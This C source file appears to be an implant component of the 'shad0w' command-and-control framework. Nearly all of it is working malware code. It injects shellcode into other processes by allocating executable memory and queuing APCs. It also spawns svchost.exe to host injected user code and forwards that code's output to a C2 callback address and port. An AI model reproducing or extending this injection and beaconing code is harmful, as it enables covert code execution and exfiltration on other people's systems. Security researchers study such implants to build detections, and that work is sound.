#define WIN32_LEAN_AND_MEAN

// kinda important 

#include <stdio.h>
#include <stdlib.h>
#include <lmcons.h>
#include <windows.h>
#include <winbase.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>

// our local stuff

#include "settings.h"
#include "loader.h"

#define MAX_OUTPUT 1000
#define IDLE_KILL_TIME 60
SYSTEMTIME start_time, current_time;

// find a process that is suitable to inject into
HANDLE FindProcess(const char* process)
{   
    DWORD PID               = 0;
    HANDLE hProcess         = NULL;
    DWORD dwProcCount       = 0;
    WTS_PROCESS_INFO* pWPIs = NULL;

    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
    {
        // error meaning we wont be able to get the processes
        printf("WTSEnumerateProcesses fail\n");
        return -1;
    }

    for(DWORD i = 0; i < dwProcCount; i++)
    {
        // check to see if we can infact open the process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);

        if (hProcess)
        {
            // if we can use the process, check it aint us an if it aint return the pid to the injector
            if ((GetCurrentProcessId() != pWPIs[i].ProcessId) && (pWPIs[i].ProcessId != 0))
            {
                // free up the memory
                WTSFreeMemory(pWPIs);
                pWPIs = NULL;

                // return the pid to the injector
                return hProcess;
            }
        }
        
    }
    // went through the loop and never got a pid :-(
    return -1;
}

BOOL InjectModule(CHAR* Bytes, DWORD Size)
{
    PVOID rBuffer;
    HANDLE hProcess;

    // get a handle on a process
    hProcess = FindProcess(NULL);

    printf("Injecting into pid: %d\n", GetProcessId(hProcess));

    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    DWORD threadId = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)
	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess))
			{
				threadId = threadEntry.th32ThreadID;
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
                DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, hThread, NULL);
                CloseHandle(hThread);
			}
		}
	}

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);

    if (threadId == 0)
    {
        // this means that we couldnt find a thread to inject into
        return FALSE;
    }

    return TRUE;
}

void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
{ 
   char chBuf[MAX_OUTPUT + 1];
   DWORD dwRead, rOpCode; 
   BOOL bSuccess = FALSE;
   
   do {
        // set the current timestamp
        GetLocalTime(&start_time);

        // read the data from the pipe
        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
        
        // send the data to shad0w
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, (char*)chBuf, 0x2000, dwRead);
        
        // clean up the old buffer
        memset(chBuf, '\0', sizeof(chBuf));
   } while (TRUE);
   
   return;
}

void ProcessWatch(HANDLE pHandle)
// not currently in use as is way to cpu intensive
{
    while (TRUE)
    {
        // check if there has been any output read yet
        if (start_time.wSecond != 0)
        {
            // if no data has been read in the last 5 seconds
            GetLocalTime(&current_time);
            if ((current_time.wSecond - start_time.wSecond) >= IDLE_KILL_TIME)
            {
                // kill the process
                TerminateProcess(pHandle, 1);
                DEBUG("killed idle process");
                return;
            }
            
        }
    }
    
}

BOOL InjectUserCode(CHAR* Bytes, DWORD Size)
{
    /*
    Run user supplied code and send all the output back to them
    */

    DWORD threadId;
    HANDLE tHandle;
    HANDLE hProcess;

    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr; 

    // Set the bInheritHandle flag so pipe handles are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

    // create a pipe to get the stdout 
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("StdoutRd CreatePipe")); 
    }

    // ensure the read handle to the pipe for stdout is not inherited.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdout SetHandleInformation"));
    }

    // create a pipe for the child process's stdin.
    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("Stdin CreatePipe")); 
    }

    // ensure the write handle to the pipe for stdin is not inherited. 
    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdin SetHandleInformation"));
    }

    // define our startup info
    STARTUPINFO sInfo;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION pInfo; 

    // zero out the structures
    ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );
    ZeroMemory( &sInfo, sizeof(STARTUPINFO) );

    // change the std values to our pipes
    sInfo.cb = sizeof(STARTUPINFO); 
    sInfo.hStdError = g_hChildStd_OUT_Wr;
    sInfo.hStdOutput = g_hChildStd_OUT_Wr;
    sInfo.hStdInput = g_hChildStd_IN_Rd;
    sInfo.dwFlags |= STARTF_USESTDHANDLES;

    // start the thread to read from the stdout pipe
    CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);

    // spawn svchost.exe with a different ppid an jus start it running
    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

    // alloc and write the code to the process
    PVOID rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
    
    // execute the code inside the process
    QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);

    // start the process cleanup thread
    // CreateThread(NULL, 0, ProcessWatch, pInfo.hProcess, 0, &threadId);

    ZeroMemory(Bytes, Size);

    return;
}

BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module)
{
    do
    {
        // select the correct way the code needs to be ran
        switch (Module)
        {
        case TRUE:
            // execute module
            InjectModule(Bytes, Size);
            break;
        
        case FALSE:
            // execute arbitary user code
            InjectUserCode(Bytes, Size);
        
        default:
            break;
        }

        DEBUG("code should have run");
        break;

    } while (TRUE);

    return TRUE;
}